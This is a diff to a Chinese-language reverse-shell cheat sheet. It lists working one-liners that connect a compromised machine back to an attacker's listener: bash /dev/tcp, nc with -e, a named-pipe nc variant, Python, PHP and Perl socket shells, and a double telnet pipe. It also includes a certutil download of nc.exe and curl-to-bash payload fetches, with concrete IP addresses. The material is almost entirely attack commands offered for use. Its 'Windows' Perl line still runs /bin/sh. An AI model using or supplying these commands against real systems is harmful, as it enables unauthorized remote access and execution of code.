@@ -3,7 +3,8 @@
 
 ## 反弹Shell
 https://www.cnblogs.com/xiaozi/p/13493010.html
-说明：端口可任意，但要保持一致而且不能被占用，以下均为攻击机登录被攻击机
+
+如果是php_shell, `?c=system('wget http://xxx')` , `wget xxx` 这里要进行url编码
 
 windows上传 `certutil -urlcache -split -f http://11.1.63.37/nc.exe nc.exe`
 
@@ -25,20 +26,26 @@ curl http://攻击机ip:2126/sa.sh|bash
 
 ## curl: shell.txt,内容为bash -i >& /dev/tcp/攻击机ip/7777 0>&1
 curl 192.168.1.20|bash
-nc -e /bin/bash 1.1.1.1 7777
+nc 127.0.0.1 7777 -e /bin/bash
 nc 127.0.0.1 7777 -e cmd.exe                       // Windows
 nc 127.0.0.1 7777 -e c:\windows\system32\cmd.exe   // Windows
 
 ## nc连接无 -e 参数
 mknod /tmp/backpipe p
 /bin/sh 0</tmp/backpipe | nc 1.1.1.1 7777 1>/tmp/backpipe
+
+nc -e /bin/sh 192.168.50.161 4444
 ## python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.32.1",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ## php
 php -r '$sock=fsockopen("192.168.32.1",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
-## perl
+## perl - Linux
 perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+## perl - Windows
+perl -e 'use Socket;$i="47.101.57.72";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
+## telnet , 攻击机监听2个端口 nc -lvvp 4445, nc -lvvp 4444
+telnet 192.168.50.161 4444 | /bin/bash | telnet 192.168.50.161 4445
 ```
 
 
